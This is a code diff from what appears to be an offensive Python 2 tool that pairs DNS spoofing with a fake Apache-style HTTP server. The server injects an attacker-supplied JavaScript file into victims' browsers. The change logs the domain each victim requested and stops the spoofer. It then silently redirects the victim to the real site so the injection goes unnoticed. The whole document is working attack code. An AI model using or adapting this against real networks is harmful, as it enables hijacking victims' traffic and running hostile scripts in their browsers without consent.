@@ -38,7 +38,7 @@ Server: Apache/2.2.17 (Unix) mod ssl/2.2 17 OpenSSL/0.9.8l DAV/2
 Last-Modified: Sat, 28 Aug 2015 22:17:02 GMT
 ETag: "20e2b8b-3c-48ee99731f380"
 Accept-Ranges: bytes
-Content-Lenght: 49
+Content-Lenght: 100
 Connection: close
 Content-Type: text/html
 
@@ -47,9 +47,6 @@ Content-Type: text/html
 <script src= {}></script>
 </head>
 """.format(self.js)
-#<body>
-#<meta http-equiv="refresh" content="0; URL='http://{}"/>
-#</body>
 		self.host = host
 		self.port = port
 
@@ -77,10 +74,24 @@ Content-Type: text/html
 		print '[+] Injection URL - http://{}:{}'.format(self.host,self.port)
 		server.bind(server_address)
 		server.listen(1)
-		for i in range (0,3):
-			if i >= 2:
+		for i in range (0,2):
+			if i >= 1:
 				print "[+] Script Injected on: ", client_address
+				domain = self.dnsspoof.getdomain()
+				domain = domain [:-1]
+				print "[+] Target was requesting: {}".format(domain)
 				self.dnsspoof.stop()
+				try:
+					connection,client_address = server.accept()
+					redirect = self.response + """<body>
+<meta http-equiv="refresh" content="0; URL='http://{}"/>
+</body>""".format(domain)
+					connection.send("%s" % redirect)
+					connection.shutdown(socket.SHUT_WR | socket.SHUT_RD)
+					connection.close()
+				except KeyboardInterrupt:
+					server.close()
+
 			try:
 				connection,client_address = server.accept()
 				connection.send("%s" % self.response)
